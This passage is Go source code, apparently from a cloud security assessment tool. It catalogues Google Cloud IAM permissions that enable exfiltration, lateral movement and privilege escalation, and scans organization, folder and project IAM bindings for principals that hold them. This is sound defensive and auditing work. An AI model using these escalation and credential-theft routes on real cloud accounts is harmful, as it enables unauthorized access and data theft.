package attackpathservice

import (
	"context"
	"fmt"
	"strings"

	iampb "cloud.google.com/go/iam/apiv1/iampb"
	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	resourcemanagerpb "cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/BishopFox/cloudfox/internal/gcp/sdk"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"

	// Resource-level IAM
	"google.golang.org/api/bigquery/v2"
	"google.golang.org/api/compute/v1"
	"google.golang.org/api/storage/v1"
)

var logger = internal.NewLogger()

// AttackPathService provides analysis for data exfiltration and lateral movement paths
type AttackPathService struct {
	session *gcpinternal.SafeSession
}

func New() *AttackPathService {
	return &AttackPathService{}
}

func NewWithSession(session *gcpinternal.SafeSession) *AttackPathService {
	return &AttackPathService{session: session}
}

// getIAMService returns an IAM service using cached session if available
func (s *AttackPathService) getIAMService(ctx context.Context) (*iam.Service, error) {
	if s.session != nil {
		return sdk.CachedGetIAMService(ctx, s.session)
	}
	return iam.NewService(ctx)
}

// getResourceManagerService returns a Resource Manager service using cached session if available
func (s *AttackPathService) getResourceManagerService(ctx context.Context) (*crmv1.Service, error) {
	if s.session != nil {
		return sdk.CachedGetResourceManagerService(ctx, s.session)
	}
	return crmv1.NewService(ctx)
}

// getStorageService returns a Storage service using cached session if available
func (s *AttackPathService) getStorageService(ctx context.Context) (*storage.Service, error) {
	if s.session != nil {
		return sdk.CachedGetStorageService(ctx, s.session)
	}
	return storage.NewService(ctx)
}

// getBigQueryService returns a BigQuery service using cached session if available
func (s *AttackPathService) getBigQueryService(ctx context.Context) (*bigquery.Service, error) {
	if s.session != nil {
		return sdk.CachedGetBigQueryService(ctx, s.session)
	}
	return bigquery.NewService(ctx)
}

// getComputeService returns a Compute service using cached session if available
func (s *AttackPathService) getComputeService(ctx context.Context) (*compute.Service, error) {
	if s.session != nil {
		return sdk.CachedGetComputeService(ctx, s.session)
	}
	return compute.NewService(ctx)
}

// DataExfilPermission represents a permission that enables data exfiltration
type DataExfilPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// LateralMovementPermission represents a permission that enables lateral movement
type LateralMovementPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// PrivescPermission represents a permission that enables privilege escalation
type PrivescPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// AttackPath represents an attack path (exfil, lateral, or privesc)
type AttackPath struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"`
	Method         string   `json:"method"`
	TargetResource string   `json:"targetResource"`
	Permissions    []string `json:"permissions"`
	Category       string   `json:"category"`
	RiskLevel      string   `json:"riskLevel"`
	Description    string   `json:"description"`
	ExploitCommand string   `json:"exploitCommand"`
	ProjectID      string   `json:"projectId"`
	ScopeType      string   `json:"scopeType"` // organization, folder, project, resource
	ScopeID        string   `json:"scopeId"`
	ScopeName      string   `json:"scopeName"`
	PathType       string   `json:"pathType"` // "exfil", "lateral", or "privesc"
}

// CombinedAttackPathData holds all attack paths across org/folder/project/resource levels
type CombinedAttackPathData struct {
	OrgPaths      []AttackPath          `json:"orgPaths"`
	FolderPaths   []AttackPath          `json:"folderPaths"`
	ProjectPaths  []AttackPath          `json:"projectPaths"`
	ResourcePaths []AttackPath          `json:"resourcePaths"`
	AllPaths      []AttackPath          `json:"allPaths"`
	OrgNames      map[string]string     `json:"orgNames"`
	FolderNames   map[string]string     `json:"folderNames"`
	OrgIDs        []string              `json:"orgIds"`
}

// GetDataExfilPermissions returns permissions that enable data exfiltration
func GetDataExfilPermissions() []DataExfilPermission {
	return []DataExfilPermission{
		// Compute Exports
		{Permission: "compute.images.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create VM images from disks for external export"},
		{Permission: "compute.snapshots.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create disk snapshots for external export"},
		{Permission: "compute.disks.createSnapshot", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create snapshots from specific disks"},
		{Permission: "compute.machineImages.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create machine images including disk data"},

		// Logging Sinks
		{Permission: "logging.sinks.create", Category: "Logging", RiskLevel: "HIGH", Description: "Create logging sinks to export logs externally"},
		{Permission: "logging.sinks.update", Category: "Logging", RiskLevel: "HIGH", Description: "Modify logging sinks to redirect to external destinations"},

		// Cloud SQL
		{Permission: "cloudsql.backups.create", Category: "Database", RiskLevel: "HIGH", Description: "Create Cloud SQL backups for export"},
		{Permission: "cloudsql.instances.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Cloud SQL data to GCS"},

		// Pub/Sub
		{Permission: "pubsub.subscriptions.create", Category: "Messaging", RiskLevel: "HIGH", Description: "Create subscriptions to intercept messages"},
		{Permission: "pubsub.subscriptions.consume", Category: "Messaging", RiskLevel: "MEDIUM", Description: "Pull messages from subscriptions"},
		{Permission: "pubsub.subscriptions.update", Category: "Messaging", RiskLevel: "HIGH", Description: "Modify subscription push endpoints"},

		// BigQuery
		{Permission: "bigquery.tables.export", Category: "BigQuery", RiskLevel: "CRITICAL", Description: "Export BigQuery tables to GCS"},
		{Permission: "bigquery.tables.getData", Category: "BigQuery", RiskLevel: "HIGH", Description: "Read data from BigQuery tables"},
		{Permission: "bigquery.jobs.create", Category: "BigQuery", RiskLevel: "MEDIUM", Description: "Run queries and extract data"},

		// Storage
		{Permission: "storage.objects.get", Category: "Storage", RiskLevel: "HIGH", Description: "Download objects from GCS buckets"},
		{Permission: "storage.objects.list", Category: "Storage", RiskLevel: "MEDIUM", Description: "List objects to identify sensitive data"},

		// Storage Transfer
		{Permission: "storagetransfer.jobs.create", Category: "Storage Transfer", RiskLevel: "CRITICAL", Description: "Create transfer jobs to external clouds"},
		{Permission: "storagetransfer.jobs.update", Category: "Storage Transfer", RiskLevel: "HIGH", Description: "Modify transfer jobs to external destinations"},

		// Spanner
		{Permission: "spanner.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Spanner databases to GCS"},
		{Permission: "spanner.databases.read", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Spanner databases"},

		// Firestore/Datastore
		{Permission: "datastore.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Firestore/Datastore data to GCS"},
		{Permission: "datastore.entities.get", Category: "Database", RiskLevel: "HIGH", Description: "Read Firestore/Datastore entities"},

		// Bigtable
		{Permission: "bigtable.tables.readRows", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Bigtable tables"},

		// Secrets
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "CRITICAL", Description: "Access secret values (API keys, credentials)"},

		// KMS
		{Permission: "cloudkms.cryptoKeyVersions.useToDecrypt", Category: "Encryption", RiskLevel: "HIGH", Description: "Decrypt encrypted data for exfiltration"},
	}
}

// GetLateralMovementPermissions returns permissions that enable lateral movement
func GetLateralMovementPermissions() []LateralMovementPermission {
	return []LateralMovementPermission{
		// VPC Peering
		{Permission: "compute.networks.addPeering", Category: "Network", RiskLevel: "CRITICAL", Description: "Create VPC peering to access resources in other projects"},
		{Permission: "compute.networks.updatePeering", Category: "Network", RiskLevel: "HIGH", Description: "Modify VPC peering configurations"},
		{Permission: "compute.networks.removePeering", Category: "Network", RiskLevel: "MEDIUM", Description: "Remove VPC peering (disruptive)"},

		// Service Networking
		{Permission: "servicenetworking.services.addPeering", Category: "Network", RiskLevel: "HIGH", Description: "Enable private service access to shared networks"},

		// Shared VPC
		{Permission: "compute.subnetworks.use", Category: "Shared VPC", RiskLevel: "HIGH", Description: "Use shared VPC subnets in other projects"},
		{Permission: "compute.subnetworks.setPrivateIpGoogleAccess", Category: "Shared VPC", RiskLevel: "MEDIUM", Description: "Modify private Google access settings"},

		// Image/Snapshot IAM
		{Permission: "compute.images.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
		{Permission: "compute.machineImages.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share machine images with external projects"},

		// SA Impersonation
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate tokens for SAs in other projects"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign as SAs in other projects"},

		// GKE
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get credentials for GKE clusters"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Execute commands in pods"},
		{Permission: "container.pods.portForward", Category: "GKE", RiskLevel: "HIGH", Description: "Port forward to pods"},

		// Compute Access
		{Permission: "compute.instances.osLogin", Category: "Compute Access", RiskLevel: "HIGH", Description: "SSH into instances via OS Login"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "SSH with sudo via OS Login"},
		{Permission: "compute.instances.setMetadata", Category: "Compute Access", RiskLevel: "HIGH", Description: "Add SSH keys via metadata"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "Add SSH keys project-wide"},

		// Cloud SQL
		{Permission: "cloudsql.instances.connect", Category: "Database Access", RiskLevel: "HIGH", Description: "Connect to Cloud SQL instances"},
		{Permission: "cloudsql.users.create", Category: "Database Access", RiskLevel: "HIGH", Description: "Create database users"},

		// VPN/Interconnect
		{Permission: "compute.vpnTunnels.create", Category: "Network", RiskLevel: "HIGH", Description: "Create VPN tunnels to external networks"},
		{Permission: "compute.interconnects.create", Category: "Network", RiskLevel: "CRITICAL", Description: "Create dedicated interconnects"},
		{Permission: "compute.routers.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Router for traffic redirection"},

		// Firewall
		{Permission: "compute.firewalls.create", Category: "Network", RiskLevel: "HIGH", Description: "Create firewall rules to allow access"},
		{Permission: "compute.firewalls.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify firewall rules to allow access"},
		{Permission: "compute.securityPolicies.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Armor policies"},

		// IAP
		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
		{Permission: "iap.tunnelDestGroups.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access resources via IAP tunnel"},
	}
}

// GetPrivescPermissions returns permissions that enable privilege escalation
// Based on research from DataDog pathfinding.cloud AWS paths, mapped to GCP equivalents
func GetPrivescPermissions() []PrivescPermission {
	return []PrivescPermission{
		// ==========================================
		// SERVICE ACCOUNT IMPERSONATION - CRITICAL
		// AWS equivalent: sts:AssumeRole
		// ==========================================
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA (AWS: sts:AssumeRole)"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA for GCS signed URLs or custom auth"},
		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA for custom authentication flows"},
		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Chain impersonation through intermediary SAs"},
		{Permission: "iam.serviceAccounts.getOpenIdToken", Category: "SA Impersonation", RiskLevel: "HIGH", Description: "Generate OIDC tokens for workload identity federation"},

		// ==========================================
		// KEY/CREDENTIAL CREATION - CRITICAL
		// AWS equivalent: iam:CreateAccessKey
		// ==========================================
		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys (AWS: iam:CreateAccessKey)"},
		{Permission: "iam.serviceAccountKeys.delete", Category: "Key Creation", RiskLevel: "HIGH", Description: "Delete existing keys to create new ones (bypass 10-key limit)"},
		{Permission: "storage.hmacKeys.create", Category: "Key Creation", RiskLevel: "HIGH", Description: "Create HMAC keys for S3-compatible access"},
		{Permission: "apikeys.keys.create", Category: "Key Creation", RiskLevel: "MEDIUM", Description: "Create API keys for service access"},

		// ==========================================
		// IAM POLICY MODIFICATION - CRITICAL
		// AWS equivalent: iam:PutRolePolicy, iam:AttachRolePolicy, iam:CreatePolicyVersion
		// ==========================================
		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project IAM - grant any role to any principal"},
		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder IAM - affects all child projects"},
		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org IAM - affects entire organization"},
		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant impersonation access to service accounts"},
		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Add permissions to custom roles (AWS: iam:CreatePolicyVersion)"},
		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create custom roles with dangerous permissions"},
		{Permission: "iam.roles.delete", Category: "IAM Modification", RiskLevel: "MEDIUM", Description: "Delete roles to disrupt access controls"},

		// Resource-level IAM Modification
		{Permission: "storage.buckets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to storage buckets"},
		{Permission: "pubsub.topics.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub topics"},
		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub subscriptions"},
		{Permission: "bigquery.datasets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to BigQuery datasets"},
		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to container/artifact registries"},
		{Permission: "compute.instances.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant OS Login access to instances"},
		{Permission: "compute.images.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
		{Permission: "kms.cryptoKeys.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to encryption keys"},

		// ==========================================
		// COMPUTE + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + ec2:RunInstances
		// ==========================================
		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create VMs with attached SA (AWS: PassRole+RunInstances)"},
		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance SA to escalate privileges"},
		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Inject SSH keys or startup scripts"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "CRITICAL", Description: "Inject SSH keys project-wide"},
		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH access via OS Login (AWS: ssm:StartSession)"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute", RiskLevel: "HIGH", Description: "SSH with sudo via OS Login"},
		{Permission: "compute.instanceTemplates.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create templates with SA for MIG exploitation"},

		// ==========================================
		// SERVERLESS + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + lambda:CreateFunction
		// ==========================================
		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA (AWS: PassRole+Lambda)"},
		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code or SA"},
		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Replace function source code"},
		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make functions publicly invocable"},

		// Cloud Run (AWS: ECS/Fargate equivalent)
		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA (AWS: PassRole+ECS)"},
		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service image or SA"},
		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make services publicly accessible"},
		{Permission: "run.jobs.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Create jobs with SA identity"},
		{Permission: "run.jobs.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify job configuration or SA"},
		{Permission: "run.jobs.run", Category: "Serverless", RiskLevel: "HIGH", Description: "Execute jobs with attached SA"},

		// ==========================================
		// DATA PROCESSING + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + glue:CreateDevEndpoint, datapipeline:*
		// ==========================================
		{Permission: "dataproc.clusters.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataproc with SA (AWS: PassRole+Glue)"},
		{Permission: "dataproc.clusters.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify cluster SA or configuration"},
		{Permission: "dataproc.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Submit jobs to clusters"},
		{Permission: "dataproc.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify running jobs"},
		{Permission: "dataflow.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataflow jobs with SA (AWS: DataPipeline)"},
		{Permission: "dataflow.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify Dataflow job configuration"},

		// ==========================================
		// ML/AI PLATFORMS + SA USAGE
		// AWS equivalent: iam:PassRole + sagemaker:CreateNotebookInstance
		// ==========================================
		{Permission: "notebooks.instances.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create Vertex AI Workbench with SA (AWS: PassRole+SageMaker)"},
		{Permission: "notebooks.instances.update", Category: "AI/ML", RiskLevel: "HIGH", Description: "Modify notebook SA or configuration"},
		{Permission: "notebooks.instances.setIamPolicy", Category: "AI/ML", RiskLevel: "HIGH", Description: "Grant access to notebook instances"},
		{Permission: "aiplatform.customJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Run custom training jobs with SA"},
		{Permission: "aiplatform.pipelineJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create ML pipelines with SA"},

		// ==========================================
		// ORCHESTRATION (Composer = AWS equivalent of Step Functions/MWAA)
		// ==========================================
		{Permission: "composer.environments.create", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Create Composer/Airflow with SA"},
		{Permission: "composer.environments.update", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Modify Composer environment SA"},

		// Cloud Scheduler (AWS: EventBridge/CloudWatch Events)
		{Permission: "cloudscheduler.jobs.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create scheduled jobs with SA"},
		{Permission: "cloudscheduler.jobs.update", Category: "Orchestration", RiskLevel: "HIGH", Description: "Modify scheduled job SA or target"},

		// Cloud Tasks (AWS: SQS + Lambda triggers)
		{Permission: "cloudtasks.tasks.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create tasks with SA for HTTP targets"},
		{Permission: "cloudtasks.queues.create", Category: "Orchestration", RiskLevel: "MEDIUM", Description: "Create task queues"},

		// ==========================================
		// CI/CD (Cloud Build = AWS CodeBuild)
		// AWS equivalent: iam:PassRole + codebuild:CreateProject
		// ==========================================
		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA (AWS: PassRole+CodeBuild)"},
		{Permission: "cloudbuild.builds.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify build configuration"},
		{Permission: "source.repos.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify source repositories for build injection"},

		// ==========================================
		// INFRASTRUCTURE AS CODE
		// AWS equivalent: iam:PassRole + cloudformation:CreateStack
		// ==========================================
		{Permission: "deploymentmanager.deployments.create", Category: "IaC", RiskLevel: "CRITICAL", Description: "Deploy infra with DM SA (AWS: PassRole+CloudFormation)"},
		{Permission: "deploymentmanager.deployments.update", Category: "IaC", RiskLevel: "HIGH", Description: "Modify deployment templates"},

		// ==========================================
		// KUBERNETES/GKE
		// AWS equivalent: eks:* permissions
		// ==========================================
		{Permission: "container.clusters.create", Category: "GKE", RiskLevel: "HIGH", Description: "Create GKE clusters with node SA"},
		{Permission: "container.clusters.update", Category: "GKE", RiskLevel: "HIGH", Description: "Modify cluster node SA or config"},
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get cluster credentials"},
		{Permission: "container.pods.create", Category: "GKE", RiskLevel: "HIGH", Description: "Deploy pods with SA"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods to steal credentials"},
		{Permission: "container.secrets.get", Category: "GKE", RiskLevel: "HIGH", Description: "Read Kubernetes secrets"},
		{Permission: "container.secrets.create", Category: "GKE", RiskLevel: "MEDIUM", Description: "Create K8s secrets for later access"},
		{Permission: "container.serviceAccounts.createToken", Category: "GKE", RiskLevel: "HIGH", Description: "Generate K8s SA tokens"},

		// ==========================================
		// SECRETS & CREDENTIAL ACCESS
		// AWS equivalent: secretsmanager:GetSecretValue, ssm:GetParameter
		// ==========================================
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values (credentials, API keys)"},
		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets", RiskLevel: "HIGH", Description: "Grant access to secrets"},
		{Permission: "secretmanager.secrets.create", Category: "Secrets", RiskLevel: "MEDIUM", Description: "Create secrets for persistence"},

		// ==========================================
		// WORKLOAD IDENTITY FEDERATION
		// AWS equivalent: iam:CreateOpenIDConnectProvider, iam:CreateSAMLProvider
		// ==========================================
		{Permission: "iam.workloadIdentityPools.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create pools for external identity access"},
		{Permission: "iam.workloadIdentityPools.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify pool configuration"},
		{Permission: "iam.workloadIdentityPoolProviders.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create providers for external impersonation"},
		{Permission: "iam.workloadIdentityPoolProviders.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify provider configuration"},

		// ==========================================
		// ORG POLICIES & CONSTRAINTS
		// AWS equivalent: organizations:* SCP modifications
		// ==========================================
		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable security constraints org-wide"},
		{Permission: "orgpolicy.constraints.list", Category: "Org Policy", RiskLevel: "LOW", Description: "Enumerate security constraints"},
		{Permission: "essentialcontacts.contacts.delete", Category: "Org Policy", RiskLevel: "MEDIUM", Description: "Remove security notification contacts"},

		// ==========================================
		// SERVICE ACCOUNT USAGE (Required for most PassRole equivalents)
		// AWS equivalent: iam:PassRole
		// ==========================================
		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation (AWS: iam:PassRole)"},

		// ==========================================
		// NETWORK ACCESS FOR LATERAL MOVEMENT
		// AWS equivalent: ec2:CreateNetworkInterface, ec2:ModifyInstanceAttribute
		// ==========================================
		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network Access", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
		{Permission: "compute.firewalls.create", Category: "Network Access", RiskLevel: "HIGH", Description: "Create firewall rules for access"},
		{Permission: "compute.firewalls.update", Category: "Network Access", RiskLevel: "HIGH", Description: "Modify firewall rules"},

		// ==========================================
		// BILLING & RESOURCE CREATION
		// Could be used to exhaust quotas or create resources
		// ==========================================
		{Permission: "billing.accounts.getIamPolicy", Category: "Billing", RiskLevel: "LOW", Description: "View billing IAM for enumeration"},
		{Permission: "billing.accounts.setIamPolicy", Category: "Billing", RiskLevel: "HIGH", Description: "Grant billing access"},
	}
}

// AnalyzeOrganizationAttackPaths analyzes org-level IAM for attack paths
func (s *AttackPathService) AnalyzeOrganizationAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, []string, error) {
	var paths []AttackPath
	orgNames := make(map[string]string)
	var orgIDs []string

	// Create organizations client
	var orgsClient *resourcemanager.OrganizationsClient
	var err error
	if s.session != nil {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx, s.session.GetClientOption())
	} else {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx)
	}
	if err != nil {
		return nil, orgNames, orgIDs, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer orgsClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for organizations
	searchReq := &resourcemanagerpb.SearchOrganizationsRequest{}
	it := orgsClient.SearchOrganizations(ctx, searchReq)
	for {
		org, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		orgID := strings.TrimPrefix(org.Name, "organizations/")
		orgNames[orgID] = org.DisplayName
		orgIDs = append(orgIDs, orgID)

		// Get IAM policy for this organization
		policy, err := orgsClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: org.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"organization", orgID, org.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, orgNames, orgIDs, nil
}

// AnalyzeFolderAttackPaths analyzes folder-level IAM for attack paths
func (s *AttackPathService) AnalyzeFolderAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, error) {
	var paths []AttackPath
	folderNames := make(map[string]string)

	// Create folders client
	var foldersClient *resourcemanager.FoldersClient
	var err error
	if s.session != nil {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx, s.session.GetClientOption())
	} else {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx)
	}
	if err != nil {
		return nil, folderNames, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer foldersClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for folders
	searchReq := &resourcemanagerpb.SearchFoldersRequest{}
	it := foldersClient.SearchFolders(ctx, searchReq)
	for {
		folder, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		folderID := strings.TrimPrefix(folder.Name, "folders/")
		folderNames[folderID] = folder.DisplayName

		// Get IAM policy for this folder
		policy, err := foldersClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: folder.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"folder", folderID, folder.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, folderNames, nil
}

// AnalyzeProjectAttackPaths analyzes project-level IAM for attack paths
func (s *AttackPathService) AnalyzeProjectAttackPaths(ctx context.Context, projectID, projectName, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get project IAM policy
	crmService, err := s.getResourceManagerService(ctx)
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	policy, err := crmService.Projects.GetIamPolicy(projectID, &crmv1.GetIamPolicyRequest{}).Do()
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Analyze each binding
	for _, binding := range policy.Bindings {
		if binding == nil {
			continue
		}

		permissions := s.getRolePermissions(iamService, binding.Role, projectID)
		for _, member := range binding.Members {
			memberPaths := s.analyzePermissionsForAttackPaths(
				member, binding.Role, permissions, projectID,
				"project", projectID, projectName,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths, nil
}

// AnalyzeResourceAttackPaths analyzes resource-level IAM for attack paths
